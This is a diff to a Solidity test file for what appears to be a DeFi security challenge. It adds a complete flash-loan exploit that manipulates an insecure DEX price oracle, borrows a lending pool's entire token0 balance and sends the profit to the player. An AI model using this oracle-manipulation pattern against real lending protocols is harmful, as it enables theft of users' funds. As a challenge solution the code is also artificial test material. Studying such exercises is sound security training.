@@ -68,6 +68,19 @@ contract Challenge3Test is Test {
         //    Add your hack below!    //
         //////////////////////////////*/
 
+        ExploitReceiver eReceiver = new ExploitReceiver();
+        Exploit e = new Exploit(
+            address(target),
+            address(oracleDex)
+        );
+
+        flashLoanPool.flashLoan(
+            address(eReceiver),
+            abi.encodeWithSignature(
+                "troll(address,address)", address(e), address(token0)
+            )
+        );
+
         //============================//
 
         vm.stopPrank();
@@ -81,9 +94,49 @@ contract Challenge3Test is Test {
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 ////////////////////////////////////////////////////////////*/
 
+
+contract ExploitReceiver {
+    function troll(address exploit, address token) external {
+        IERC20(token).transfer(exploit, IERC20(token).balanceOf(address(this)));
+        
+        Exploit(exploit).hack();
+    }
+}
+
 contract Exploit {
     IERC20 token0;
     IERC20 token1;
     BorrowSystemInsecureOracle borrowSystem;
     InsecureDexLP dex;
+    address player;
+
+    constructor(address _borrowSystem, address _dex) {
+        player = msg.sender;
+        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
+        
+        dex = InsecureDexLP(_dex);
+        token0 = IERC20(dex.token0());
+        token1 = IERC20(dex.token1());
+
+        token0.approve(_borrowSystem, type(uint256).max);
+        token1.approve(_borrowSystem, type(uint256).max);
+
+        token0.approve(_dex, type(uint256).max);
+        token1.approve(_dex, type(uint256).max);
+    }
+
+    function hack() external {
+        address flashLoan = msg.sender;
+        uint256 _balance = token0.balanceOf(address(this));
+
+        uint256 _amountToken1 = dex.swap(address(token0), address(token1), 8000 ether);
+        
+        borrowSystem.depositToken1(_amountToken1);
+        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
+                                    
+        token0.transfer(flashLoan, _balance);
+
+        token0.transfer(player, token0.balanceOf(address(this)));
+    }
+    
 }
